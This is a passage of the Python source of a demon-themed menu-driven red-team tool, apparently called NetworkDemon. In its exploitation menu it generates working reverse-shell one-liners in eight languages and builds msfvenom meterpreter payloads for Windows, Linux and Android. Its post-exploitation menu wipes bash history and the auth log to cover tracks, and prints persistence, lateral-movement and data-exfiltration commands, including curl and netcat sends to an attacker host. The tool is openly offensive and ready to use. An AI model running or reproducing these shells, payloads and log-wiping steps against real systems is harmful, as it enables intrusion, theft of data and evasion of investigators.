            print(f"{RED}Invalid option.{RESET}")


def show_exploitation():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ EXPLOITATION ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Metasploit")
        print(f"{symbol()} 2 {symbol()} Searchsploit")
        print(f"{symbol()} 3 {symbol()} CVE Lookup")
        print(f"{symbol()} 4 {symbol()} Reverse Shell Generator")
        print(f"{symbol()} 5 {symbol()} Msfvenom Payload")
        print(f"{symbol()} 6 {symbol()} Back")
        print(f"{DARK_RED}⛧══════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("Metasploit")
            if shutil.which("msfconsole"):
                subprocess.run(["msfconsole"], check=False)
            else:
                print(f"{RED}Metasploit not installed. Install with: sudo apt install metasploit-framework{RESET}")

        elif choice == "2":
            log_tool("Searchsploit")
            if not shutil.which("searchsploit"):
                print(f"{RED}Searchsploit not installed. Install with: sudo apt install exploitdb{RESET}")
                continue
            term = input(f"{ORANGE}Search term: {RESET}").strip()
            if term:
                subprocess.run(["searchsploit", term], check=False)

        elif choice == "3":
            log_tool("CVE Lookup")
            cve = input(f"{ORANGE}Enter CVE number (e.g. CVE-2021-44228): {RESET}").strip().upper()
            if not cve:
                print(f"{RED}No CVE provided.{RESET}")
                continue
            import urllib.request
            import json
            try:
                url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}"
                req = urllib.request.Request(url, headers={"User-Agent": "NetworkDemon"})
                with urllib.request.urlopen(req, timeout=15) as resp:
                    data = json.loads(resp.read().decode())
                vulns = data.get("vulnerabilities") or []
                if not vulns:
                    print(f"{RED}No record found for {cve}.{RESET}")
                    continue
                entry = vulns[0].get("cve", {})
                summary = next(
                    (d["value"] for d in entry.get("descriptions", []) if d.get("lang") == "en"),
                    "N/A",
                )
                metrics = entry.get("metrics", {})
                score = "N/A"
                for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
                    if metrics.get(key):
                        cvss = metrics[key][0].get("cvssData", {})
                        severity = cvss.get("baseSeverity") or metrics[key][0].get("baseSeverity", "")
                        score = f"{cvss.get('baseScore', 'N/A')} {severity}".strip()
                        break
                print(f"\n{DARK_RED}⛧ {entry.get('id', cve)} ⛧{RESET}")
                print(f"{ORANGE}Published:{RESET} {entry.get('published', 'N/A')}")
                print(f"{ORANGE}CVSS Score:{RESET} {score}")
                print(f"{ORANGE}Summary:{RESET} {summary}")
            except Exception as e:
                print(f"{RED}CVE lookup failed: {e}{RESET}")

        elif choice == "4":
            log_tool("Reverse Shell Generator")
            ip = input(f"{ORANGE}Your IP (LHOST): {RESET}").strip()
            port = input(f"{ORANGE}Port (LPORT): {RESET}").strip()
            if not ip or not port:
                print(f"{RED}IP and port required.{RESET}")
                continue
            print(f"\n{DARK_RED}⛧ Reverse Shells for {ip}:{port} ⛧{RESET}")
            shells = {
                "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
                "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "Netcat": f"nc -e /bin/sh {ip} {port}",
                "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
                "Ruby": f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
                "Java": f"r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"]);p.waitFor();",
                "Powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            }
            for name, shell in shells.items():
                print(f"\n{ORANGE}{name}:{RESET}")
                print(f"{RED}{shell}{RESET}")

        elif choice == "5":
            log_tool("Msfvenom Payload")
            if not shutil.which("msfvenom"):
                print(f"{RED}msfvenom not installed. Install with: sudo apt install metasploit-framework{RESET}")
                continue
            os_choice = input(f"{ORANGE}Target OS [1] Windows [2] Linux [3] Android: {RESET}").strip()
            os_map = {"1": "windows", "2": "linux", "3": "android"}
            target_os = os_map.get(os_choice)
            if not target_os:
                print(f"{RED}Invalid OS.{RESET}")
                continue
            payload_map = {
                "windows": "windows/meterpreter/reverse_tcp",
                "linux": "linux/x64/meterpreter/reverse_tcp",
                "android": "android/meterpreter/reverse_tcp",
            }
            payload = payload_map[target_os]
            lhost = input(f"{ORANGE}LHOST: {RESET}").strip()
            lport = input(f"{ORANGE}LPORT: {RESET}").strip()
            fmt = input(f"{ORANGE}Format [1] exe [2] elf [3] apk: {RESET}").strip()
            fmt_map = {"1": "exe", "2": "elf", "3": "apk"}
            output_fmt = fmt_map.get(fmt, "elf")
            outfile = input(f"{ORANGE}Output filename: {RESET}").strip() or f"payload.{output_fmt}"
            subprocess.run(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", output_fmt, "-o", outfile], check=False)

        elif choice == "6":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_post_exploitation():
    first = True
    while True:
        if not first:
            pause()
        first = False
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ POST EXPLOITATION ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Privilege Escalation Checker")
        print(f"{symbol()} 2 {symbol()} Cover Tracks")
        print(f"{symbol()} 3 {symbol()} Persistence Guide")
        print(f"{symbol()} 4 {symbol()} Lateral Movement Guide")
        print(f"{symbol()} 5 {symbol()} Data Exfiltration Guide")
        print(f"{symbol()} 6 {symbol()} Back")
        print(f"{DARK_RED}⛧══════════════════════════════════⛧{RESET}")
        choice = demon_input(f"{RED}⛧ > {RESET}").strip()

        if choice == "1":
            log_tool("Privilege Escalation Checker")
            linpeas_paths = [
                "/opt/linpeas.sh",
                os.path.expanduser("~/linpeas.sh"),
                "/tmp/linpeas.sh",
            ]
            found = next((p for p in linpeas_paths if os.path.exists(p)), None)
            if found:
                subprocess.run(["bash", found], check=False)
            else:
                print(f"{RED}linpeas.sh not found.{RESET}")
                print(f"{ORANGE}Download with: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o ~/linpeas.sh{RESET}")

        elif choice == "2":
            log_tool("Cover Tracks")
            confirm = input(f"{RED}This will clear bash history and auth logs. Confirm? (yes/no): {RESET}").strip().lower()
            if confirm == "yes":
                open(os.path.expanduser("~/.bash_history"), "w").close()
                if os.geteuid() == 0:
                    open("/var/log/auth.log", "w").close()
                    print(f"{ORANGE}Auth log cleared.{RESET}")
                print(f"{ORANGE}Bash history file cleared.{RESET}")
                print(f"{RED}Note: this only clears the history FILE. A still-running shell keeps{RESET}")
                print(f"{RED}its own history in memory and can overwrite this file when it exits.{RESET}")
            else:
                print(f"{RED}Cancelled.{RESET}")

        elif choice == "3":
            log_tool("Persistence Guide")
            print(f"\n{DARK_RED}⛧ Persistence Techniques ⛧{RESET}")
            print(f"{ORANGE}1. Cron Job:{RESET} {RED}echo '* * * * * /path/to/payload' | crontab -{RESET}")
            print(f"{ORANGE}2. Startup Script:{RESET} {RED}Add payload to /etc/rc.local{RESET}")
            print(f"{ORANGE}3. SSH Key:{RESET} {RED}Add your public key to ~/.ssh/authorized_keys{RESET}")
            print(f"{ORANGE}4. Alias:{RESET} {RED}Add malicious alias to ~/.bashrc{RESET}")
            print(f"{ORANGE}5. Systemd Service:{RESET} {RED}Create a service in /etc/systemd/system/{RESET}")

        elif choice == "4":
            log_tool("Lateral Movement Guide")
            print(f"\n{DARK_RED}⛧ Lateral Movement Techniques ⛧{RESET}")
            print(f"{ORANGE}1. SSH Pivoting:{RESET} {RED}ssh -L localport:targetIP:targetport user@pivot{RESET}")
            print(f"{ORANGE}2. Pass the Hash:{RESET} {RED}Use captured NTLM hashes with pth-winexe{RESET}")
            print(f"{ORANGE}3. SMB Relay:{RESET} {RED}Use responder and ntlmrelayx{RESET}")
            print(f"{ORANGE}4. Port Forwarding:{RESET} {RED}ssh -D 9050 user@pivot (SOCKS proxy){RESET}")
            print(f"{ORANGE}5. Metasploit Routes:{RESET} {RED}route add subnet mask session_id{RESET}")

        elif choice == "5":
            log_tool("Data Exfiltration Guide")
            print(f"\n{DARK_RED}⛧ Data Exfiltration Methods ⛧{RESET}")
            print(f"{ORANGE}1. SCP:{RESET} {RED}scp file user@attacker:/path{RESET}")
            print(f"{ORANGE}2. Netcat:{RESET} {RED}nc attacker_ip port < file{RESET}")
            print(f"{ORANGE}3. DNS Exfil:{RESET} {RED}Encode data in DNS queries{RESET}")
            print(f"{ORANGE}4. HTTP POST:{RESET} {RED}curl -X POST -d @file http://attacker/upload{RESET}")
            print(f"{ORANGE}5. Base64 encode:{RESET} {RED}base64 file | nc attacker_ip port{RESET}")

        elif choice == "6":
            return
        else:
            print(f"{RED}Invalid option.{RESET}")


def show_vpn_checker():
    log_tool("VPN Checker")
    import urllib.request

    print(f"\n{DARK_RED}⛧ VPN STATUS ⛧{RESET}")
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=10) as response:
            public_ip = response.read().decode("utf-8").strip()
        if public_ip:
            print(f"{ORANGE}Public IP:{RESET} {RED}{public_ip}{RESET}")
        else:
            print(f"{RED}Public IP service returned an empty response.{RESET}")
    except Exception as exc:
        print(f"{RED}Could not fetch public IP: {exc}{RESET}")

    vpn_markers = (
        "openvpn", "openconnect", "wg-quick", "wireguard", "tailscaled",
        "mullvad", "protonvpn", "nordvpn", "expressvpn", "anyconnect",
        "strongswan", "charon", "private internet access",
    )
    detected_processes = []
    ps_path = shutil.which("ps")
    if ps_path:
        result = subprocess.run([ps_path, "aux"], capture_output=True, text=True, check=False)
        detected_processes = [
            line.strip() for line in (result.stdout or "").splitlines()
            if any(marker in line.lower() for marker in vpn_markers)
        ]
    else:
        print(f"{RED}Cannot check VPN processes: ps was not found.{RESET}")

    tunnel_interfaces = []
    ip_path = shutil.which("ip")
    if ip_path:
        result = subprocess.run([ip_path, "-brief", "address", "show"], capture_output=True, text=True, check=False)
        tunnel_prefixes = ("tun", "tap", "wg", "ppp", "tailscale")
        tunnel_interfaces = [
            line.split()[0] for line in (result.stdout or "").splitlines()
            if line.split() and line.split()[0].split("@")[0].lower().startswith(tunnel_prefixes)
        ]
    else:
        print(f"{RED}Cannot check VPN interfaces: ip was not found.{RESET}")

    if detected_processes or tunnel_interfaces:
        print(f"{ORANGE}Possible VPN activity detected:{RESET}")
        for process in detected_processes:
            print(f"{RED}Process: {process}{RESET}")
        for interface in tunnel_interfaces:
            print(f"{RED}Tunnel interface: {interface}{RESET}")
    else:
        print(f"{RED}No recognized VPN process or tunnel interface detected.{RESET}")
    print(f"{ORANGE}Note:{RESET} this is a local heuristic; a VPN on your router may not appear here.")


def show_tool_checker():
    log_tool("Tool Checker")
    tools = [
        ("nmap", "sudo apt install nmap"),
        ("hydra", "sudo apt install hydra"),
        ("aircrack-ng", "sudo apt install aircrack-ng"),
        ("aireplay-ng", "sudo apt install aircrack-ng"),
        ("airodump-ng", "sudo apt install aircrack-ng"),
        ("reaver", "sudo apt install reaver"),
        ("bettercap", "sudo apt install bettercap"),
        ("wifite", "sudo apt install wifite"),
        ("tshark", "sudo apt install tshark"),
        ("tcpdump", "sudo apt install tcpdump"),
        ("searchsploit", "sudo apt install exploitdb"),
        ("msfconsole", "sudo apt install metasploit-framework"),
        ("msfvenom", "sudo apt install metasploit-framework"),
        ("arpspoof", "sudo apt install dsniff"),
        ("bluetoothctl", "sudo apt install bluez"),
        ("macchanger", "sudo apt install macchanger"),
        ("dig", "sudo apt install dnsutils"),
        ("whois", "sudo apt install whois"),
        ("iw", "sudo apt install iw"),
        ("iwlist", "sudo apt install wireless-tools"),
    ]
    print(f"\n{DARK_RED}⛧ TOOL CHECKER ⛧{RESET}")
    missing_tools = []
    installed_count = 0
    for tool, install_cmd in tools:
        if shutil.which(tool):
            print(f"{ORANGE}⛧{RESET} {tool:<20} {ORANGE}INSTALLED{RESET}")
            installed_count += 1
        else:
            print(f"{RED}⛧{RESET} {tool:<20} {RED}MISSING{RESET} - {install_cmd}")
            missing_tools.append((tool, install_cmd))

    print(f"\n{ORANGE}Installed: {installed_count} / {len(tools)}{RESET}")
    if missing_tools:
        print(f"\n{RED}TOOLS NOT INSTALLED ({len(missing_tools)}):{RESET}")
        for tool, install_cmd in missing_tools:
            print(f"{RED}- {tool}: {install_cmd}{RESET}")
    else:
        print(f"{ORANGE}All checked tools are installed.{RESET}")


def show_main_menu(name):
    while True:
        show_demon_signal()
        print(f"\n{DARK_RED}⛧═══════ RED TEAM ═══════⛧{RESET}")
        print(f"{symbol()} 1 {symbol()} Network Attacks")
        print(f"{symbol()} 2 {symbol()} Wireless Hacking")
        print(f"{symbol()} 3 {symbol()} Device Discovery")
        print(f"{symbol()} 4 {symbol()} Router Attacks")
        print(f"{symbol()} 5 {symbol()} Traffic Analysis")
        print(f"{symbol()} 6 {symbol()} Exploitation")
        print(f"{symbol()} 7 {symbol()} Post Exploitation")
        print(f"\n{DARK_RED}⛧═══════ TOOLS ═══════⛧{RESET}")
        print(f"{symbol()} 8 {symbol()} Notes")
        print(f"{symbol()} 9 {symbol()} VPN Checker")
        print(f"{symbol()} 10 {symbol()} Tool Checker")
        print(f"\n{DARK_RED}⛧═══════════════════════⛧{RESET}")
        print(f"{RED}⛧ 11 ⛧{RESET} Exit")

        choice = demon_input(f"\n{RED}⛧ {name} > {RESET}").strip()

        if choice == "1":
            flash_submenu()
            show_network_attacks()
        elif choice == "2":
            flash_submenu()
            show_wireless_hacking()
        elif choice == "3":
            flash_submenu()
            show_device_discovery()
        elif choice == "4":
            flash_submenu()
            show_router_attacks()
        elif choice == "5":
            flash_submenu()
            show_traffic_analysis()
        elif choice == "6":
            flash_submenu()
            show_exploitation()
        elif choice == "7":
            flash_submenu()
            show_post_exploitation()
        elif choice == "8":
            flash_submenu()
            show_notes_menu()
        elif choice == "9":
            flash_submenu()
            show_vpn_checker()
            pause()
        elif choice == "10":
            flash_submenu()
            show_tool_checker()
            pause()
        elif choice == "11":
            stop_idle_timer()
            exit_quote = random.choice(EXIT_QUOTES)
            type_out(f"\n    {exit_quote}", DARK_RED, delay=0.05)
            time.sleep(1)
            sys.exit(0)
        else:
            print(f"{RED}Invalid option.{RESET}")


if __name__ == "__main__":
    try:
        animate_banner()
        user_name = ritual_login()
        show_main_menu(user_name)
    except KeyboardInterrupt:
        stop_idle_timer()
        print(f"\n{DARK_RED}    The demon releases you... for now.{RESET}")
        sys.exit(0)